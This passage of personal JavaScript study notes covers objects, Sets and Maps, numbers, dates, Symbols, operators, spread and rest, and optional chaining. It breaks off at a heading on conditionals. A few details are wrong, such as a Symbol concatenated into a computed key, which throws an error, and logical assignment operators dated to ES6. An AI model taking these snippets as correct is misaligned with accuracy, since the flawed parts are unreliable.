- This syntax also makes it possible to use `Symbols` as computed property names:

```js
const roleSymbol = Symbol('role');
const user = {
  [roleSymbol]: 'Admin',
  [roleSymbol + 'Id']: 42
};
```

##### Spread Operator on Objects

- The spread operator `...` can be used to copy all the properties of an object into another object.

```js
const jonas = { name: 'Jonas', birthYear: 1991 };
const jonasCopy = { ...jonas };
console.log(jonasCopy); // { name: 'Jonas', birthYear: 1991 }
```

- It can also be used to merge two objects:

```js
const jonas = { name: 'Jonas', birthYear: 1991 };
const jonasCopy = { ...jonas, age: 30 };
console.log(jonasCopy); // { name: 'Jonas', birthYear: 1991, age: 30 }
```

##### Object Destructuring

It's a way to extract multiple values from an object and assign them to variables in a single statement.

- Destructuring with changing variable name

  ```js
  const { name: restaurantName, openingHours: hours, categories: tags } = restaurant;
  console.log(restaurantName, hours, tags);
  ```

- Destructuring with default values

  ```js
  const { menu = [], starterMenu: starters = [] } = restaurant;
  ```

- Destructuring with different names for the same property

  ```js
  const { name: restaurantName, openingHours: hours, categories: tags } = restaurant;
  // Now, we can use 'restaurantName' instead of 'name', 'hours' instead of 'openingHours', and 'tags' instead of 'categories'
  console.log(restaurantName, hours, tags);
  ```

- Destructuring values from nested objects

  ```js
  const obj = {
    name: 'Jonas',
    age: 33,
    job: 'teacher',
    friends: ['Michael', 'Peter'],
    // nested object
    location: {
      lat: 36.5,
      lng: -12.3
    }
  };

  const {
    location: { lat, lng }
  } = obj;
  const {
    friends: [friend1, friend2]
  } = obj;
  ```

- Use cases:
  - extracting function parameters

    ```js
    const calcAge = function ({ birthYear }) {
      return 2037 - birthYear;
    };

    console.log(calcAge({ birthYear: 1991 }));
    ```

##### Property getter and setter

- The **getter** method allows you to execute code when a property is accessed.
- The **setter** method allows you to execute code when a property is assigned.

- Example:

  ```js
  const jonas = {
    firstName: 'Jonas',
    lastName: 'Smith',
    birthYear: 1991,
    // getter
    get fullName() {
      return `${this.firstName} ${this.lastName}`;
    },
    // setter
    set fullName(name) {
      const [firstName, lastName] = name.split(' ');
      this.firstName = firstName;
      this.lastName = lastName;
    }
  };
  ```

---

### Sets

A **Set** is a collection of unique values (no duplicates).

- **Methods**:
  - `new Set(iterable)`: Creates a set, optionally from an iterable (e.g., array).
  - `set.add(value)`: Adds a value.
  - `set.delete(value)`: Removes a value, returns `true` if it existed.
  - `set.has(value)`: Checks if a value exists, returns `true` if it does.
  - `set.clear()`: Removes all values.
  - `set.size`: Returns the number of elements.

- To convert `map` / `set` to `array`: use `Array.from()` or `spread operator`

  ```js
  let arr = [1, 2, 2, 3];
  const set = new Set(arr); // {1, 2, 3}

  // convert set to array
  arr = Array.from(set); // [1, 2, 3]
  // or
  arr = [...set]; // [1, 2, 3]
  ```

- We can loop over a set either with `for..of` or using `forEach`

  ```js
  let set = new Set(['oranges', 'apples', 'bananas']);

  for (let value of set) {
    console.log(value);
  }

  // the same with forEach:
  set.forEach((value, valueAgain, set) => {
    console.log(value);
  });
  ```

---

#### WeakSet

- It is similar to Set, but we may **only add objects** to `WeakSet` (not primitives).
- An object exists in the set **while it is reachable from somewhere else**.

  ```js
  let visitedSet = new WeakSet();

  let john = { name: 'John' };
  let pete = { name: 'Pete' };
  let mary = { name: 'Mary' };

  visitedSet.add(john); // John visited us
  visitedSet.add(pete); // Then Pete
  visitedSet.add(john); // John again

  // visitedSet has 2 users now
  alert(visitedSet.has(john)); // true
  alert(visitedSet.has(mary)); // false

  john = null;
  // visitedSet will clean up John references upon next garbage collection
  ```

> The most notable limitation of `WeakMap` and `WeakSet` is the **absence of iterations**, and the inability to get all current content. That may appear inconvenient, but does not prevent WeakMap/WeakSet from doing their main job – be an “additional” storage of data for objects which are stored/managed at another place.

---

### Maps

**Map** is data structure that allows to map `keys` to `values` without the drawbacks of using objects as keys.

![map](./img/map.png)

- The `Map()` constructor creates a new `Map` object in JavaScript, and takes an iterable object as an argument (e.g., an `array`).

  ```js
  const map = new Map();
  map.set('1', 'str1'); // a string key

  // or
  const map2 = new Map([
    ['1', 'str1'], // array of [key, value] pairs
    [1, 'num1'],
    [true, 'bool1']
  ]);

  // or
  const obj = {
    name: 'Jonas',
    age: 33
  };
  const map3 = new Map(Object.entries(obj)); // convert object to map
  ```

- Use **variables** for `arrays` as keys in a `Map` to avoid multiple memory allocations and access issues.

  ```js
  // Correct way ✅
  const arr = [1, 2];
  const map = new Map();
  map.set(arr, 'test');
  map.get(arr); // 'test'

  // Incorrect way ❌
  map.set([1, 2], 'test');
  map.get([1, 2]); // undefined -> because it's a different array in memory
  ```

- The main differences with `Objects` are:
  - `Map` allows keys of **any type**
  - `Map` is **ordered** (the keys are iterated in the same order as they were inserted).

- `Maps` vs `Objects`
  ![objects](./img/maps-vs-obj.jpg)

- **Map Methods**:
  - `new Map()`: Creates a map.
  - `map.set(key, value)`: Adds a key-value pair. Can chain calls:

    ```js
    map.set('1', 'str1').set(1, 'num1').set(true, 'bool1');
    ```

  - `map.get(key)`: Returns the value by key.
  - `map.has(key)`: Checks if a key exists.
  - `map.delete(key)`: Removes a key-value pair.
  - `map.clear()`: Clears the map.
  - `map.size`: Returns the number of elements.

- **Convert Map to Object**:

  ```js
  // Object.fromEntries method that does the reverse: given an array of [key, value] pairs, it creates an object from them
  let prices = Object.fromEntries([
    ['banana', 1],
    ['orange', 2],
    ['meat', 4]
  ]);

  let obj = Object.fromEntries(fruitsMap.entries());
  // or
  let obj = Object.fromEntries(map); // as Object.fromEntries expects an iterable object as the argument
  ```

---

#### WeakMap

![WwakMap](./img/weakMap.png)

- if we use an object as the key in a regular Map, then while the Map exists, that object exists as well. It occupies memory and may not be garbage collected.

  ```js
  let john = { name: 'John' };
  let map = new Map();
  map.set(john, '...');
  john = null; // overwrite the reference
  // john is stored inside the map,
  // we can get it by using map.keys()
  ```

- **WeakMap** is fundamentally different in this aspect. **It doesn’t prevent garbage-collection of key objects**.

- The first difference between **Map** and **WeakMap** is that keys must be objects, not primitive values:

  ```js
  let weakMap = new WeakMap();
  let obj = {};
  weakMap.set(obj, 'ok'); // works fine (object key)

  // can't use a string as the key
  weakMap.set('test', 'Whoops'); // Error, because "test" is not an object
  ```

- if we use an object as the key in it, and there are no other references to that object – it will be removed from memory (and from the map) automatically.

  ```js
  let john = { name: 'John' };
  let weakMap = new WeakMap();
  weakMap.set(john, '...');

  john = null; // overwrite the reference
  // john is removed from memory!
  ```

  > The main area of application for WeakMap is an **additional data storage**.
  >
  > - If we’re working with an object that “belongs” to another code, maybe even a third-party library, and would like to store some data associated with it, that should only exist while the object is alive – then **WeakMap** is exactly what’s needed.
  >
  > ```js
  > weakMap.set(john, 'secret documents');
  > // if john dies, secret documents will be destroyed automatically
  > ```

---

## Numbers

Unlike many other programming languages that have separate types for integers and floating-point (decimal) numbers, JavaScript represents almost all numbers using a single 64-bit floating-point format (IEEE 754 standard). This means that all numbers in JavaScript, whether they are integers or floating-point, are of the same type: `Number`.

```js
132 === 132.0; // true
```

- You can write numbers in your code (called numeric literals) in several ways, and modern JavaScript even lets you use underscores as separators to make long numbers easier to read:

  ```js
  let billion = 1_000_000_000; // 1 billion
  let million = 1_000_000; // 1 million
  let bytes = 0x89_ab_cd_ef; // Hexadecimal (base-16) starts with 0x [8]
  let bits = 0b0001_1101_0111; // Binary (base-2) starts with 0b [8]
  let fraction = 0.123_456_789; // Works in the fractional part, too [8]
  let exponent = 6.02e23; // Scientific notation (6.02 × 10²³) [8]
  ```

- Use `Number.isFinite()` or `Number.isNaN()` to check if a number is a finite number or `NaN`.

  ```js
  // checks if the value is a number
  Number.isFinite(15); // true
  Number.isFinite('15'); // false
  Number.isFinite(Infinity); // false
  Number.isFinite(23 / 0); // false

  // checks if the value is NaN
  Number.isNaN('15'); // false
  Number.isNaN(NaN); // true
  Number.isNaN(Infinity); // false
  ```

- Get a random number between two values:

  ```js
  function getRandomNum(min, max) {
    return Math.random() * (max - min) + min;
  }

  function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + Math.ceil(min);
  }
  ```

- **Format/Parse Numbers**
  - Parse numbers:

    ```js
    // parseInt -> returns an integer
    parseInt('12.34'); // 12 (base 10)
    parseInt('100px'); // 100 (base 10)
    parseInt('year2020'); // NaN (no digits at the beginning)
    parseInt('111', 2); // 7 (base 2)

    // parseFloat -> returns a floating-point number
    parseFloat('12.34'); // 12.34
    parseFloat('100px'); // 100

    // toFixed -> returns a string with a specified number of decimal places
    (12.34).toFixed(1); // "12.3"
    (12.34).toFixed(4); // "12.3400"
    ```

  - Format currency: [Formatting](https://www.samanthaming.com/tidbits/30-how-to-format-currency-in-es6/)

- **Notes**
  - `toFixed()`
    - returns a `string`, so if you need a number, use `+` or `Number()` to convert it.

      ```js
      let num = 12.34;
      alert(num.toFixed(1)); // 12.3 -> type: string
      alert(+num.toFixed(1)); // 12.3 -> type: number
      ```

  - `Math.round()` and `toFixed()`
    - both round to the nearest number: `0..4` **lead down** while `5..9` **lead up**.
  - `toString()`
    - Used for object-to-primitive conversion, and returns a string representation of the object, for example `[2, 3].toString()` returns `"2,3"`
    - can take a base to convert to (The base can vary from `2` to `36`. By default it’s `10`)
      > ⚠️ Watch out from this JS quirck: `[].toString()` returns `""` which is empty string, not `null`, `undefined` or `"undefined"`.

  - **calculations**:
    - floating-point numbers are not precise, so it's better to use `toFixed()` to round the result.

      ```js
      alert(0.1 + 0.2 == 0.3); // false
      alert(0.1 + 0.2); // 0.30000000000000004
      ```

      - why? -> because A **number is stored in memory in its binary form**, a sequence of `bits` (`ones` and `zeroes`). But fractions like `0.1`, `0.2` that look simple in the decimal numeric system are actually unending fractions in their `binary` form.
      - So `0.1` is one divided by ten `1/10`, In decimal numeral system such numbers are easily representable. Compare it to one-third: `1/3`. It becomes an endless fraction `0.33333`.
      - So, division by powers `10` is guaranteed to work well in the decimal system, but division by `3` is not.
      - This is important to know especially when we do financial calculations where precision is important. **(e.g. cryptocurrencies, banking, etc.)**
      - Solution:

        ```js
        alert((0.1 * 10 + 0.2 * 10) / 10); // 0.3
        // OR
        alert(+(0.1 + 0.2).toFixed(2)); // 0.3
        ```

    - (square / cube) root of a value:

      ```js
      alert(Math.sqrt(9)); // 3
      // or
      alert(9 ** (1 / 2)); // 3
      alert(27 ** (1 / 3)); // 3 -> cube root
      ```

---

### Math operations

To do math, JavaScript gives us basic arithmetic operators: `+` (addition), `-` (subtraction), `*` (multiplication), `/` (division), `%` (modulo/remainder), and `**` (exponentiation).

For more complex calculations, JavaScript provides a built-in `Math` object full of mathematical functions and constants.

```js
// Rounding
alert(Math.floor(3.1)); // 3 (round down)
alert(Math.ceil(3.1)); // 4
alert(Math.round(3.1)); // 3 (round to nearest integer (up or down)()
alert(Math.trunc(3.1)); // 3 (remove anything after the decimal point)

alert(Math.sqrt(9)); // 3
alert(Math.pow(2, 3)); // 8
alert(Math.abs(-5)); // 5

alert(Math.max(1, 2, 3, 4, 5)); // 5
alert(Math.min(1, 2, 3, 4, 5)); // 1

alert(Math.random()); // random number from 0 to 1
```

- Dividing by zero in JS doesn't crash the program, it returns `Infinity`, and dividing zero by zero returns `NaN`.

  ```js
  alert(1 / 0); // Infinity
  alert(0 / 0); // NaN
  ```

- Arithmetic operations are evaluated from left to right (except for exponentiation `**` which is evaluated from right to left):

  ```js
  alert(5 + 2 * 3); // 5 + (2 * 3) = 5 + 6 = 11
  alert(5 * 2 + 3); // (5 * 2) + 3 = 10 + 3 = 13

  // exponentiation is evaluated from right to left
  alert(2 ** (2 ** 3)); // 2 ** (2 ** 3) = 2 ** 8 = 256
  ```

- The Quirks of the `+` Operator
  - it can be used for both addition and string concatenation.

    ```js
    alert(1 + 1); // 2 (addition)
    alert('1' + '1'); // "11" (concatenation)
    alert(1 + '1'); // "11" (concatenation)

    alert(1 + {}); // "1[object Object]" - objects are converted to strings
    alert(1 + []); // "1" - empty arrays are converted to empty strings
    ```

---

### Special numbers & Math quirks

#### Math Quirks: Infinity and NaN

In JavaScript, arithmetic doesn't cause the program to crash or raise errors in extreme cases like division by zero or invalid operations. Instead, it returns special values: (`Infinity`, `-Infinity`, and `NaN`).

- `Infinity`
  - represents a value that is greater than any finite number **(too big to represent - overflow)**. It can be positive or negative (`-Infinity`).
- `NaN` (Not-a-Number)
  - represents a value that is not a valid number. It is the result of an invalid or undefined mathematical operation. like `0 / 0` or `'hello' / 2`.

  > **⚠️ A major "Gotcha!":** `NaN` is the only value in JavaScript that is not equal to itself. So, `NaN === NaN` returns `false`. To check if a value is `NaN`, use `Number.isNaN(value)` instead of equality checks.

#### The Famous Floating-Point Rounding Error

- Due to the way numbers are represented in binary, some decimal fractions cannot be represented precisely, leading to rounding errors.

  ```js
  alert(0.1 + 0.2); // 0.30000000000000004
  alert(0.1 + 0.2 === 0.3); // false
  ```

#### BigInt (Arbitrary Precision Integers)

To safely work with incredibly large integers, ES2020 introduced a new numeric type called **BigInt**. It can represent integers with arbitrary precision, meaning it can handle numbers larger than `Number.MAX_SAFE_INTEGER` without losing accuracy.

```js
const bigInt = 9007199254740991n; // BigInt literal (ends with 'n')
const bigIntFromConstructor = BigInt(9007199254740991); // Using the BigInt constructor

1n + 2n; // 3n
BigInt(352); // 352n
typeof 1n; // bigint
20n === 20; // false -> strict equality
20n == 20; // true -> loose equality
```

- Big numbers can't be used with normal numbers:

  ```js
  alert(1n + 2); // Error ❌  -> can't mix BigInt and other types
  alert(1n + 2n); // 3
  ```

#### Numeric Separators

- It's a syntactic sugar to write big numbers.

```js
let num = 1_000_000; // 1 million -> JavaScript ignores underscores (_)
let numFromStr = +'1_00'; // NaN ❌ (string with `_` is not a number)
let numFromStr = num + 20; // 1000020 ✅
```

#### Maximum numbers in JavaScript

- JavaScript can’t represent all numbers precisely. There’s a limit for the maximum number that can be represented precisely, and it’s called `Number.MAX_SAFE_INTEGER`.

  ```js
  alert(Number.MAX_SAFE_INTEGER); // 9007199254740991
  alert(Number.MIN_SAFE_INTEGER); // -9007199254740991

  // also the maximum number
  alert(Number.MAX_VALUE); // 1.7976931348623157e+308
  ```

---

### Numbers Internationalization

It's a modern way to work with numbers that adapts to the user's locale (country & language).

- **Intl.NumberFormat**:
  - It's a constructor for objects that enable language-sensitive number formatting.

- Currency formatting:

  ```js
  let num = 123456.789;

  let options = {
    style: 'currency',
    currency: 'EUR'
  };

  alert(new Intl.NumberFormat('de-DE', options).format(num)); // 123.456,79 €
  alert(new Intl.NumberFormat('en-US', options).format(num)); // €123,456.79
  ```

- Temperature formatting:

  ```js
  let num = -40;

  let options = {
    style: 'unit',
    unit: 'celsius'
  };

  alert(new Intl.NumberFormat('en-US', options).format(num)); // -40°C
  alert(new Intl.NumberFormat('ar-EG', options).format(num)); // -٤٠°C
  ```

---

## Date

For working with time, JavaScript has a built-in `Date` object that provides methods for creating, manipulating, and formatting dates and times.

To create a new Date object call: `new Date()`

- `new Date()` -> Without arguments – create a Date object for the current date and time:

  ```js
  let now = new Date(); // 2021-09-01T12:00:00.000Z

  // new Date(milliseconds)
  let d0 = new Date(3 * 24 * 3600 * 1000); // 3 days from 01.01.1970

  // new Date(year, month, date, hour, minute, second, millisecond)
  let d1 = new Date(2012, 1, 20, 3, 12); // 20 Feb 2012, 3:12am

  // new Date(datastring)
  let d2 = new Date('2012-02-20T03:12'); // 20 Feb 2012, 3:12am
  ```

- `date.getTime()` -> returns the number of milliseconds from the beginning of time `(Jan 1, 1970)`

  ```js
  // 0 means 01.01.1970 UTC+0
  let Jan01_1970 = new Date(0);
  Jan01_1970.getTime(); // 0
  ```

- **Date methods**
  ![date](./img/date.png)

- **Notes**:
  - Don't use `getYear()`, but use `getFullYear()`, because `getYear()` is deprecated and it returns 2-digit year sometimes.
    - `getYear()` returns year minus `1900`. This has been deprecated for a while now, it's best to use `getFullYear()`.
  - `month` is **zero-based** so we add `1` to it to get the correct month

  ```js
  let date = new Date(2012, 0, 3); // 3 Jan 2012
  let date = new Date(2012, 1, 3); // 3 Feb 2012
  let date = new Date(2012, 2, 3); // 3 Mar 2012
  ```

  - when you perform operations on `dates`, the result is in form of `milliSeconds`

- **Dates Autocorrelation**
  - It's a very handy feature of `Date` objects. We can set out-of-range values, and it will auto-adjust itself.

    ```js
    let date = new Date(2013, 0, 32); // 32 Jan 2013 -> 1 Feb 2013
    // Here, the "month" is specified with more days than it already has, so it goes to the next month.
    ```

---

### Operations with Dates

- **Date to number, date diff**
  - When a Date object is converted to number, it becomes the timestamp same as `date.getTime()`:

    ```js
    let date = new Date();
    alert(+date); // the number of milliseconds, same as date.getTime()
    ```

- **Parsing date from a string**
  - `Date.parse(str)` reads a date from a string and returns the timestamp (milliseconds since 1 Jan 1970 UTC+0).
    - Returns **NaN** if the format is invalid.
  - Format: `YYYY-MM-DDTHH:mm:ss.sssZ`
    - `YYYY-MM-DD` – year-month-day.
    - `T` – delimiter.
    - `HH:mm:ss.sss` – time: hours, minutes, seconds, milliseconds.
    - `Z` – optional time zone in `+-hh:mm` or `Z` for UTC+0.

  ```js
  let ms = Date.parse('2012-01-26T13:51:50.417-07:00');
  alert(ms); // 1327611110417 (timestamp)
  ```

- **Comparing dates**
  - As dates are objects, we can't compare them with `==` or `===` or `<` or `>`
  - So we convert them to numbers first, or we use `.valueOf()` method, or we use `date.getTime()` method

  ```js
  let d1 = new Date(2012, 0, 3);
  let d2 = new Date(2012, 0, 3);
  alert(d1 == d2); // false ❌
  alert(d1.getTime() == d2.getTime()); // true ✅
  alert(d1.valueOf() == d2.valueOf()); // true ✅
  alert(+d1 == +d2); // true ✅
  ```

---

### Dates Internationalization

It's a modern way to work with dates and times that adapts to the user's locale (country & language).

> [`Intl.DateTimeFormat` cheatsheet](https://devhints.io/wip/intl-datetime)

- **Intl.DateTimeFormat**:
  - It's a constructor for objects that enable language-sensitive date and time formatting.

  ```js
  let date = new Date(Date.UTC(2012, 11, 20, 3, 0, 0));

  let options = {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  };

  new Intl.DateTimeFormat('en-US', options).format(date); // Thursday, December 20, 2012
  new Intl.DateTimeFormat('ar-EG', options).format(date); // الخميس، ٢٠ ديسمبر، ٢٠١٢
  ```

- To get the user's locale, use `navigator.language` or `navigator.languages` (for an array of locales)

  ```js
  const locale = navigator.language; // "en-US"
  ```

---

### Dates Third-party Libraries

- **Moment.js**:
  - It's a popular library for parsing, validating, manipulating, and formatting dates.

    ```js
    const moment = require('moment');
    moment().format('MMMM Do YYYY, h:mm:ss a'); // September 1st 2021, 12:00:00 pm
    ```

- **Day.js**:
  - It's a minimalist JavaScript library that parses, validates, manipulates, and displays dates and times.

    ```js
    const dayjs = require('dayjs');
    dayjs().format('YYYY-MM-DD'); // 2021-09-01
    ```

---

## Symbols

A **Symbol** is a unique and immutable primitive value **(non-string identifier)** that can be used as a key for object properties. It was introduced in ES6 to provide a way to create unique identifiers for object properties, ensuring that they do not conflict with other property keys.

- **Creating Symbols**:
  - You can create a symbol using the `Symbol()` function. Each time you call `Symbol()`, it returns a new, unique symbol. _Don't use `new Symbol()` as it will throw an error._

    ```js
    const sym1 = Symbol('description');
    const sym2 = Symbol('description');
    console.log(sym1 === sym2); // false -> each symbol is unique
    ```

> If you actually want to share a Symbol across different parts of your program, JavaScript provides a Global Symbol Registry. You can use `Symbol.for("shared")` which will create a new symbol the first time, and then return that exact same symbol whenever you call it again with the same string

- **Using Symbols as Object Keys**:
  - Symbols can be used as keys for object properties, and they do not conflict with string keys.

    ```js
    const sym = Symbol('key');
    const obj = {
      [sym]: 'value'
    };
    console.log(obj[sym]); // 'value'
    ```

---

## Operators & Expressions

- **Operator** is a special symbol that performs specific operations on one, two, or three operands, and then returns a result.
- **operand** is what operators are applied to
- **Expression** is a piece of code that evaluates to a value.
  - Most of operators are expressions, but not all expressions are operators.
    - `a + 2` is an expression because it evaluates to a value, but it is not an operator
    - `a++` is an expression because it evaluates to a value, and it is an operator

### Types of Operators

- **Arithmetic Operators:** `+` (add), `-` (subtract), `*` (multiply), `/` (divide).
- **Shorthand Math:** `count++` adds 1 to a variable, and `count += 2` adds 2.
- **Relational Operators:** These test relationships and evaluate to `true` or `false`. For example, `x === y` checks if two values are exactly equal, while `x !== y` checks if they are unequal. We also use `<`, `>`, `<`, and `>=`.
- **Logical Operators:** Combine boolean (`true`/`false`) values. `&&` means AND, `||` means OR, and `!` means NOT (which inverts the boolean).
  - It does "short-circuiting", meaning that it will stop evaluating the expression as soon as it finds a value that determines the result.
- **Ternary Operator:** `condition ? value1 : value2`, or known as **"The conditional (`?:`) operator**".
  - It is a concise way to write a simple if-else statement.
- `in` operator: `prop in object`
  - Returns `true` if the specified property is in the specified object.

    ```js
    const obj = {
      name: 'John',
      age: 30
    };
    console.log('name' in obj); // true
    console.log('age' in obj); // true
    console.log('address' in obj); // false
    ```

- `instanceof` operator: `object instanceof Constructor`
  - Returns `true` if the specified object is an instance of the specified constructor.

    ```js
    const obj = {
      name: 'John',
      age: 30
    };
    console.log(obj instanceof Object); // true
    ```

- There're also other types of operators in JavaScript, but we can classify them into 3 main types:
  - **Unary** operators -> is for 1 operand
    - **Pre-increment/decrement** -> `++x`, `--x` (increments/decrements the value before using it)
    - **Post-increment/decrement** -> `x++`, `x--` (increments/decrements the value after using it)
    - **Unary plus** -> `+x` (converts the value to a number)
    - **Unary minus** -> `-x` (converts the value to a number and negates it)
    - **Logical NOT** -> `!x` (inverts the boolean value)
    - **Bitwise NOT** -> `~x` (inverts the bits of the operand)

    ```js
    // Increment/decrement a variable
    let x = 1;
    x++; // 2
    x--; // 1

    // Unary plus/minus
    let y = -2;
    console.log(+y); // -2
    console.log(-y); // 2

    // Logical NOT
    console.log(!true); // false
    console.log(!0); // true
    ```

  - **Binary** operators -> is for 2 operands

    ```js
    // Addition
    console.log(5 + 2); // 7

    // (Logical / Boolean / Bitwise) operators
    console.log(true && false); // false
    console.log(true || false); // true
    ```

  - **Ternary** operators -> is for 3 operands

    ```js
    // Conditional (ternary) operator
    let result = condition ? value1 : value2;
    ```

- **Notes:**
  - logical operators (like `&&`) allow you to compare the results of more than one comparison operator (like `===`).
  - The values `undefined` & `NaN` shouldn’t be compared to other values:

    ```js
    alert(undefined > 0); // false
    alert(undefined < 0); // false
    alert(undefined == 0); // false

    // "null" only equals "undefined"
    alert(undefined == null); // true
    alert(undefined === null); // false

    // NaN is incomparable with any value
    alert('NaN' > 0); // false
    alert('NaN' < 0); // false
    alert('NaN' == 0); // false
    alert('NaN' == NaN); // false (NaN is special)
    ```

  - There're new **"logical assignment operators"** like `**=`, `??=`, `&&=`, `||=` introduced in ES6, where `a ??= b` means `a = a ?? b`.
  - Be careful when using comparison-operators with mixing strings and numbers, as JS will convert strings to numbers when comparing them to numbers, and it may not always work as expected.

    ```js
    alert(5 > '4'); // true
    alert('5' > 4); // true
    alert(5 < '6'); // true
    alert('5' < 6); // true

    alert('one' > 0); // false -> "one" is converted to NaN, and NaN > 0 is false
    alert('one' < 0); // false -> "one" is converted to NaN, and NaN < 0 is false
    alert('one' == 0); // false -> "one" is converted to NaN, and NaN == 0 is false
    alert('one' === 0); // false -> "one" is converted to NaN, and NaN === 0 is false
    ```

  - Note that logical operators don't actually return `true` or `false`, but rather the value of the last operand that was evaluated. and this value is converted to `true` or `false` when needed (when using it in an if statement for example)

    ```js
    console.log(true && 5); // 5 because 5 is the last evaluated operand
    console.log(true || false); // true because true is the last evaluated operand
    ```

  - OR `||` operator is commonly used by developers to assign default values to variables:

    ```js
    let maxValue = maxWidth || 100;
    ```

---

### Operator Precedence

**Operator precedence** determines the order in which operators are evaluated in an expression. Operators with higher precedence are evaluated first.

- Order:
  - **Parentheses** have the highest precedence and can be used to force an expression to evaluate in the order you want.

  - **Unary operators**

  - **Multiplication, division, and modulo**

  - **Addition and subtraction**

  - **Relational operators**

  - **Equality operators**

  - **Logical `AND`**

  - **Logical `OR`** has lower precedence than the logical `AND` operator.

  - **Assignment operators** have the lowest precedence.

- Example

  ```js
  let x = 2 + 3 * 4; // 2 + 12 = 14

  let y = (2 + 3) * 4; // 5 * 4 = 20
  ```

---

### Spread Operator

The spread operator `...` allows an **iterable** to expand in places where `0+` arguments are expected.

```js
let arr = [3, 5, 1];
alert(Math.max(...arr)); // 5
```

- It's used for [Object destructuring](#object-destructuring) and [Array destructuring](#array-destructuring).
- It's used on the **right side** of an assignment to spread an iterable into the elements of the array.

  ```js
  let arr = [3, 5, 1];
  let arr2 = [8, 9, 15];
  let merged = [0, ...arr, 2, ...arr2];
  // merged = [0, 3, 5, 1, 2, 8, 9, 15]
  ```

- Use cases:
  - **Copying an array**

    ```js
    let arr = [1, 2, 3];
    let arrCopy = [...arr]; // like arr.slice()
    ```

  - **Concatenating arrays**

    ```js
    let arr1 = [1, 2, 3];
    let arr2 = [4, 5, 6];
    let merged = [...arr1, ...arr2];
    ```

  - **Passing an array to a function that normally requires a list of many arguments**

    ```js
    let arr = [3, 5, 1];
    Math.max(...arr); // 5
    ```

  - **Converting from `string` to `array`**

    ```js
    let str = 'Hello';
    let chars = [...str]; // ['H', 'e', 'l', 'l', 'o']
    ```

  - **Merging objects**

    ```js
    let mergedObj = { ...obj1, ...obj2 };
    ```

  - **Copying an object**

    ```js
    let obj = { a: 1, b: 2 };
    let objCopy = { ...obj };
    ```

---

### Rest Parameters

It's used to **collect** a **variable number of arguments** into an array.

- It's used on the **left side** of a function parameter to collect all the remaining arguments into an array.

  ```js
  const [a, b, ...others] = [1, 2, 3, 4, 5];
  console.log(a, b, others); // 1 2 [3, 4, 5]
  ```

- Use cases:
  - Collect elements that aren't used in destructuring

    ```js
    let [name, age, ...titles] = ['Julius', 41, 'Consul', 'Imperator'];
    alert(titles); // ['Consul', 'Imperator']
    ```

    - It must be the **last** in the list of parameters, as it collects the **rest** of the parameters.

  - **Function that accepts any number of arguments**

    ```js
    function sumAll(...args) {
      let sum = 0;

      args.forEach(arg => (sum += arg));

      return sum;
    }

    alert(sumAll(1)); // 1
    alert(sumAll(1, 2)); // 3
    alert(sumAll(1, 2, 3)); // 6
    ```

    - Prior to ES6, we used the `arguments` object to achieve the same result. However, the `arguments` object is not a real array, so we need to convert it to an array using `Array.from()` or the spread syntax `...`.

      ```js
      function sumAll() {
        let sum = 0;

        for (let i = 0; i < arguments.length; i++) {
          sum += arguments[i];
        }

        return sum;
      }
      ```

  - **Function that accepts a fixed number of arguments**

    ```js
    function showName(firstName, lastName, ...titles) {
      alert(firstName + ' ' + lastName); // Julius Caesar

      // the rest go into titles array
      // i.e. titles = ["Consul", "Imperator"]
      alert(titles[0]); // Consul
      alert(titles[1]); // Imperator
      alert(titles.length); // 2
    }

    showName('Julius', 'Caesar', 'Consul', 'Imperator');
    ```

    - The rest parameters must be **at the end** of the parameters list for a function.

---

### Short circuiting - Nullish coalescing operator `??`

- **Short-circuiting**
  - It's a technique used to avoid unnecessary work or evaluation.
  - It's used in logical operations to skip the evaluation of the right-hand operand when the left-hand operand is enough to determine the outcome of the operation.

    ```js
    let x = 1;
    x > 0 && console.log('Hello'); // Hello
    ```

  - It's also used when we have complex conditions

    ```js
    let x = 1;
    let y = 2;

    if (x > 0 && y > 0) {
      console.log('Hello');
    }
    ```

  - The result of this is not a `boolean`, but the value of the last evaluated expression.
    - `OR` -> returns the first truthy value or the last value if no truthy value is found.

    ```js
    console.log(3 || 'Jonas'); // 3
    console.log('' || 'Jonas'); // Jonas
    console.log(undefined || null); // null
    ```

    - `AND` -> returns the first falsy value or the last value if no falsy value is found.

      ```js
      console.log(3 && 'Jonas'); // Jonas
      console.log('' && 'Jonas'); // ''
      console.log(undefined && null); // undefined
      ```

- **Nullish coalescing operator `??`** - First-Defined Operator
  - It's introduced in ES2020.
  - It returns the first **defined value** (non-nullish or non-undefined value).
  - It evaluates the expression from left to right and stops when it finds the first value that is not `null` or `undefined`.
    ![nullish coalescing operator](./img/nullish%20coalescing%20operator.webp)
    - if `a` is defined, then `a`.
    - if `a` isn’t defined, then `b`.
  - It's a way to handle default values more predictably than `||` operator.
  - Example:

    ```js
    let height = 0;
    console.log(height || 100); // 100
    console.log(height ?? 100); // 0 -> because height is 0 (and not `null` or `undefined`)

    let width;
    console.log(width || 100); // 100
    console.log(width ?? 100); // 100 -> because width is undefined

    let condition = false;
    console.log(condition || true); // true
    console.log(condition ?? true); // false -> because condition is false (and not `null` or `undefined`)
    ```

  - It's a good replacement for `||` when we want to treat `0` or `''` as a valid value.

  - It's used to provide a default value for a variable that may be `null` or `undefined`.

- **Optional chaining** `?.`
  ![Optional chaining](./img/Optional%20chaining.webp)
  - It's a safe way to access nested object properties, even if an intermediate property doesn’t exist.
  - It allows reading the value of a property located deep within a chain of connected objects without having to check that each reference in the chain is valid.
  - If the value is `undefined` or `null` at any point in the chain, it will stop and return `undefined` instead of throwing an error.
    - This is called **short-circuiting** because it stops evaluating the expression as soon as it finds a `null` or `undefined` value.
  - enables you to read the value of a property located deep within a chain of connected objects without having to check that each reference in the chain is valid.

    ```js
    let user = undefined;

    console.log(user.address.street); // error ❌
    console.log(user?.address?.street); // undefined ✅

    // this is better than using `&&` to check each property
    console.log(user && user.address && user.address.street); // undefined ✅ but it's not clean
    ```

  - We can use `?.` for safe reading and deleting, but not writing

  - it works well with `nullish coalescing operator` `??`:

---

## Statements

Expressions are evaluated to produce a value, but statements are executed to actually make something happen.

For example: `a + b` is an expression, but `if (a > b)` is a statement.

- There are a few basic types of statements:
  - Expression statements:
    - most of what we’ve seen in the previous chapters: variable assignments, function calls, etc.
  - Compound statements:
    - a group of statements that are executed together, like multiple statements wrapped inside curly braces `{}`
  - Control flow statements:
    - statements that control the flow of execution
    - e.g. `if` statement, `for` statement, `while` statement, `switch` statement, `try` statement, etc.

### Conditional Statements (`if` - `else`)

